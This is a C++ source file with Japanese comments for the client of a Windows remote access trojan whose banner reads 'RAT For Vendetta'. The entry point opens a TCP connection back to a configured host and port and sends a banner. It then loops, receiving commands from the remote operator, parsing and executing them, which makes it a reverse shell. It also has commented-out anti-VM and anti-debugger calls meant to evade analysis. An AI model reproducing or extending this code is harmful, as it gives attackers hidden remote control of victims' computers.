// メイン
#include "Vendetta.h"

// 外部で定義された変数
struct Arg {
    char ipAddress[255] = "127.0.0.1";
    int port = 4444;
};

// エントリポイント
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

    Arg arg;

    //AntiVM();
    //AntiDbg();


    // Winsock初期化
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // ソケット作成
    mainSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // サーバーのアドレス情報を設定
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(arg.port);
    inet_pton(AF_INET, arg.ipAddress, &serverAddr.sin_addr);

    // サーバーに接続
    connect(mainSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));

    char recvBuffer[DEFAULT_BUFLEN];
    int recvBufferLen = DEFAULT_BUFLEN;

    std::string str = R"(
                          __             ___
                         // )    ___--""    "-.
                    \ |,"( /`--""              `.    
                     \/ o                        \
                     (   _.-.              ,'"    ;  
                      |\"   /`. \  ,      /       |
                      | \  ' .'`.; |      |       \.______________________________
                        _-'.'    | |--..,,,\_    \________------------""""""""""""
                       '''"   _-'.'       ___"-   )
                             '''"        '''---~""

            /$$$$$$$   /$$$$$$  /$$$$$$$$       /$$$$$$$$                 
           | $$__  $$ /$$__  $$|__  $$__/      | $$_____/                 
           | $$  \ $$| $$  \ $$   | $$         | $$     /$$$$$$   /$$$$$$ 
           | $$$$$$$/| $$$$$$$$   | $$         | $$$$$ /$$__  $$ /$$__  $$
           | $$__  $$| $$__  $$   | $$         | $$__/| $$  \ $$| $$  \__/
           | $$  \ $$| $$  | $$   | $$         | $$   | $$  | $$| $$      
           | $$  | $$| $$  | $$   | $$         | $$   |  $$$$$$/| $$      
           |__/  |__/|__/  |__/   |__/         |__/    \______/ |__/      
                                                               
     __     __                            __             __      __               
    |  \   |  \                          |  \           |  \    |  \              
    | $$   | $$  ______   _______    ____| $$  ______  _| $$_  _| $$_     ______  
    | $$   | $$ /      \ |       \  /      $$ /      \|   $$ \|   $$ \   |      \ 
     \$$\ /  $$|  $$$$$$\| $$$$$$$\|  $$$$$$$|  $$$$$$\\$$$$$$ \$$$$$$    \$$$$$$\
      \$$\  $$ | $$    $$| $$  | $$| $$  | $$| $$    $$ | $$ __ | $$ __  /      $$
       \$$ $$  | $$$$$$$$| $$  | $$| $$__| $$| $$$$$$$$ | $$|  \| $$|  \|  $$$$$$$
        \$$$    \$$     \| $$  | $$ \$$    $$ \$$     \  \$$  $$ \$$  $$ \$$    $$
         \$      \$$$$$$$ \$$   \$$  \$$$$$$$  \$$$$$$$   \$$$$   \$$$$   \$$$$$$$                                                                                                                                                                                                  
)";

    // 各行を送信する
    std::istringstream stream(str);
    std::string line;

    while (std::getline(stream, line)) {
        line += "\n";
        Sleep(10);
        send(mainSocket, line.c_str(), static_cast<int>(line.size()), 0);
    }

    // 最後の空行を送信
    send(mainSocket, "\n", 1, 0);



    
    

    // メインループ
    while (true) {
        // シェルプロンプト等を送信
        SendPrompt(mainSocket);

        memset(recvBuffer, 0, recvBufferLen);
        int bytesReceived = recv(mainSocket, recvBuffer, recvBufferLen, 0);

        if (bytesReceived > 0) {
            recvBuffer[bytesReceived - 1] = '\0';
            std::string recBufferString(recvBuffer);

            std::vector<std::string> tokens = ParseCommand(recBufferString);
            ExecuteCommand(tokens);
        }
        else if (bytesReceived == 0) {
            // 接続が閉じられた
            break;
        }
        else {
            // エラー発生
            int error = WSAGetLastError();
            if (error == WSAEWOULDBLOCK) {
                continue;
            }
            else {
                //std::cerr << "recv failed with error: " << error << std::endl;
                break;
            }
        }
    }


    // クリーンアップ
    closesocket(mainSocket);
    WSACleanup();
    return 0;
}
